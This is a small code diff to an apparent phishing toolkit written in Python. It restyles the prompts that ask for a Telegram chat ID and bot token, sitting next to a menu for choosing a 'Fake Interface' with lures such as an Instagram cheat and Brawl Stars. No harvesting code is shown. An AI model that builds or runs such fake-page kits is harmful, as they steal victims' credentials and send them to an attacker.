@@ -81,13 +81,11 @@ if "12" in user_input:
     print("")
     print("\033[96m< < < ====================================================== > > >\033[0m ")
     print("")
-    userid = input(Fore.RED +  "Enter your Telegram Chat ID > ")
+    userid = input(Fore.RED +  "\033[91m[\033[92m*\033[91m]\033[93m Enter Your Telegram Chat ID \033[96m >>> \033[0m ")
     print("")
-    token = input(Fore.BLUE +  "Enter Your Bot Token > ")
+    token = input(Fore.BLUE +  "\033[91m[\033[92m*\033[91m]\033[95m Enter Your Bot Token \033[96m >>> \033[0m  ")
     print("")
     print("\033[96m< < < ====================================================== > > >\033[0m ")
-    print("")
-    print("")
     print("\n\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Punched the number \033[0m  ")
     print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram cheat \033[0m  ")
     print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m Brawl stars \033[0m  ")
@@ -97,7 +95,7 @@ if "12" in user_input:
     choice = input(Fore.MAGENTA +  "\033[96m\033[91m[\033[0m\033[91m *** \033[0m\033[96m]\033[0m\033[96m  Select the Fake Interface Option  \033[91m >>> ")
 	
     if not choice.isdigit():
-        print("Error, option must be numeric")
+        print("Error, Option Must be Numeric")
         exit(0)
 
     choice = int(choice)
